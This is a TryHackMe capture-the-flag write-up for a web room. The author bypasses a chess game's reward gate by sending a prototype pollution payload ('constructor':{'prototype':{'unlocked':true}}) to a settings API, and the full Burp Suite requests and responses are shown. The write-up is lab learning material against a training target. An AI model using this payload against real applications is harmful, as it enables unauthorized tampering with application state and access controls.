---
title: "Fools Mate, Revenge Writeup"
date: 2026-07-11
tags:
  - ctf
  - writeup
  - TryHackMe
  - Javascript
  - Web
  - API
draft: true
description: "Hack Javascript to successfully get checkmate and receive the flag"
---

# TryHackMe - Fools Mate, Revenge

> **Challenge Summary:** Hack Javascript to successfully get checkmate and receive the flag
>
> Platform: TryHackMe
> Category: Web
> Difficulty: Medium
> OS/Target: Web

---

## Objective

Successfully checkmate the enemy king to receive the flag.

---

## Attack Flow

```
Recon → Vulnerability Identification → Flags
```

---

## Setup

### Environment

- Attacker: Kali
- Target: 10.145.178.182:3000
- VPN/Tunnel: VPN
- Tools: Burp Suite, Chrome

### Notes

The Fools Mate series have been a couple of fun CTF's so far. I was fine with this room up until doing prototype pollution which I haven't done before.
Here's a good read about this type of attack [Port Swigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)

---

## Reconnaissance

### Launch the webpage and see what happens

<img src="cdn.chris-smith.net/TryHackMe/foolsm8v2/Screenshot-2026-07-11-at-3.16.25%E2%80%AFPM-7449338a.png" alt="Webpage" style="display:block; max-width:100%; height:auto;" loading="lazy" />

We can immediately see two functions on the page, reset and save preferences. Also when checkmating blacks king with white's rook, we get a denial message.

### Burp Suite

Lets take a look at the functions in Burp Suite to see what's going on. I proxied the web traffic through Burp Suite and sent these three things over to repeater: the reset function, save preferences function, and checkmating the king. Having all three in repeater helped me send different values to the API, reset, test again. Rinse and repeat.

#### Checkmate Request

This is what's sent when I move the white rook to checkmate the king.

```bash
POST /api/move HTTP/1.1
Host: 10.145.178.182:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.145.178.182:3000/
Content-Type: application/json
Content-Length: 25
Origin: http://10.145.178.182:3000
Connection: keep-alive
Cookie: sid=74747c8686625552dbe2874fd399c8e5
Priority: u=0

{"from":"a1","to":"a8"}
```

#### Checkmate Response

We find a helpful clue provided in the response to checkmating the king.

`"reason":"reward gate closed: session.config.unlocked is not set"`

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 241
ETag: W/"f1-C9LMe/pSiyoulK1VHiWkWkzJzvY"
Date: Sat, 11 Jul 2026 21:02:26 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"ok":true,"move":"a1a8","fen":"R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1","status":"checkmate","turn":"b","winner":"white","locked":true,"message":"Checkmate! No reward for you.","reason":"reward gate closed: session.config.unlocked is not set"}
```

#### Reset Request

```bash
POST /api/reset HTTP/1.1
Host: 10.146.134.208:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.146.134.208:3000/
Origin: http://10.146.134.208:3000
Connection: keep-alive
Cookie: sid=dcc5f0bff343dcd81286d20c77ea4cda
Priority: u=0
Content-Length: 0
```

#### Reset Response

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 86
ETag: W/"56-rYei/vltB3R0k8/yXJAuhPCcvE0"
Date: Sun, 12 Jul 2026 20:52:46 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"ok":true,"fen":"6k1/5ppp/8/8/8/8/5PPP/R5K1 w - - 0 1","status":"ongoing","turn":"w"}
```

#### Settings Request

It looks like we can modify settings in the API here. Successfully tested changing the value for theme.

```bash
POST /api/settings HTTP/1.1
Host: 10.145.178.182:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.145.178.182:3000/
Content-Type: application/json
Content-Length: 104
Origin: http://10.145.178.182:3000
Connection: keep-alive
Cookie: sid=74747c8686625552dbe2874fd399c8e5
Priority: u=0

{"theme":"forest","pieceSet":"classic","animationMs":180}
```

#### Settings Response

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 81
ETag: W/"51-u8Kv5atrEHV46eMN35kGQ45rDqU"
Date: Sat, 11 Jul 2026 21:28:41 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"ok":true,"preferences":{"theme":"dark","pieceSet":"classic","animationMs":180}}
```

### Initial Findings

- In the checkmate response we're provided a clue, `"reason":"reward gate closed: session.config.unlocked is not set"`
  - Make an extra note of the part where it says "not set"
- We can send different values to /api/settings

---

## Vulnerability Identification

### Attacking /api/settings

We found that we're able to send different values to /api/settings, so per the clue I start sending a whole bunch of custom values, such as `{"unlocked":"true"}`, `{"locked":"false"}`, and `{"config":{"unlocked":"true"}}` added onto the normal preferences payload.

Every attempt just echoed straight back in the response, unchanged and with no effect on the reward gate, for example:

```json
{"ok":true,"preferences":{"theme":"dark","pieceSet":"classic","animationMs":180,"unlocked":"true"}}
```

```json
{"ok":true,"preferences":{"theme":"dark","pieceSet":"classic","animationMs":180,"locked":"false"}}
```

```json
{"ok":true,"preferences":{"theme":"dark","pieceSet":"classic","animationMs":180,"config":{"unlocked":"true"}}}
```

None of the values I could think of or find in my research would stick. Eventually this led me to prototype pollution, which I hadn't heard of before.

---

## Exploitation

### Vulnerability

- Issue: Prototype Pollution
- Affected service: Javascript

### Exploit Steps

In Burp Suite Repeater, on the settings request, change the body to:

`{"theme":"dark","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}`

```bash
POST /api/settings HTTP/1.1
Host: 10.145.178.182:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.145.178.182:3000/
Content-Type: application/json
Content-Length: 104
Origin: http://10.145.178.182:3000
Connection: keep-alive
Cookie: sid=74747c8686625552dbe2874fd399c8e5
Priority: u=0

{"theme":"dark","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}
```

<img src="cdn.chris-smith.net/TryHackMe/foolsm8v2/Screenshot-2026-07-12-at-1.44.23%E2%80%AFPM-9a98bdd5.png" alt="Pollution2" style="display:block; max-width:100%; height:auto;" loading="lazy" />

After sending the settings payload, we replay the checkmate move and get the flag.

<img src="cdn.chris-smith.net/TryHackMe/foolsm8v2/Screenshot-2026-07-12-at-1.45.25%E2%80%AFPM-eef8d106.png" alt="Flag" style="display:block; max-width:100%; height:auto;" loading="lazy" />

---

## Flags

| # | Flag |
|---|----------|
| 1 | THM{pr0t0_********_***_*******} <--obfuscated

---

## Lessons Learned

- Where the initial clue said "not set" was the biggest tell. Knowing about prototype pollution, if I were to see that again it would be more easily noticeable.
- The API was more secure than the first version of this room, but exposing the settings to the user introduced a weakness. Then using a variable in the code that was never set is an additional weakness that could lead to even greater issues, since "polluting" that variable isn't just limited to the user session. If another app uses it, that could cause huge unintended issues.

---

## References

- [Port Swigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
